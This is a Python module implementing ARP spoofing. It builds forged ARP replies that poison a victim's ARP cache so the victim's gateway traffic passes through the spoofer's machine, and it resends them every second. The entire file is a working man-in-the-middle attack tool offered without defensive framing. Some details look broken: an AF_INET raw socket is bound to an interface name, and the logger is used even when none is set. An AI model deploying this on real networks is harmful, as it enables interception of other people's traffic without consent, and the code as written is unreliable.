"""python module to perform arp spoofing"""
import socket
import time

class Arpspoofer():
    """Class to perform arp spoofing"""
    def __init__(self, ip_spoofer, mac_spoofer, ip_victim, mac_victim, ip_gateway, mac_gateway, logger=None):
        if logger is not None:
            self.logger = logger
        self.bool = True
        self.ip_spoofer = socket.inet_aton(ip_spoofer)
        self.mac_spoofer = self.convert_mac_to_hex(mac_spoofer)
        self.ip_victim = socket.inet_aton(ip_victim)
        self.mac_victim = self.convert_mac_to_hex(mac_victim)
        self.ip_gateway = socket.inet_aton(ip_gateway)
        self.mac_gateway = self.convert_mac_to_hex(mac_gateway)
        self.trace = Arpspoofer.create_arp_trace(self.mac_victim, self.ip_victim,\
            self.mac_spoofer, self.ip_gateway)
        self.arp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.htons(0x0800))
        self.arp_socket.bind(("eth0",socket.htons(0x0800)))

    def convert_mac_to_hex(self, mac):
        """function convert mac type to hex array"""
        mac_list = mac.split(':')
        hex_mac = bytes.fromhex(mac_list[0])
        for element in mac_list[1:]:
            hex_mac = hex_mac + bytes.fromhex(element)
        return hex_mac

    def handler(self):
        """function reacts when ctrl-c is pressed"""
        self.logger("restoring arp tables")
        self.bool = False
        trace = Arpspoofer.create_arp_trace(self.mac_victim, self.ip_victim,\
            self.mac_gateway, self.ip_gateway)
        self.arp_socket.send(trace)

    def run(self):
        """function runs the engine of the spoofing"""
        while self.bool:
            self.arp_socket.send(self.trace)
            time.sleep(1)

    @staticmethod
    def create_arp_trace(mac_victim, ip_victim, mac_spoofer, ip_gateway):
        """function creates trace to send arp reply"""
        htype = b'\x00\x01'
        protype = b'\x08\x00'
        hsize = b'\x06'
        psize = b'\x04'
        opcode = b'\x00\x02'
        code = b'\x08\x06'
        ethernet = mac_victim + mac_spoofer + code
        return ethernet + htype + protype + hsize + psize + opcode\
        + mac_spoofer + ip_gateway + mac_victim + ip_victim
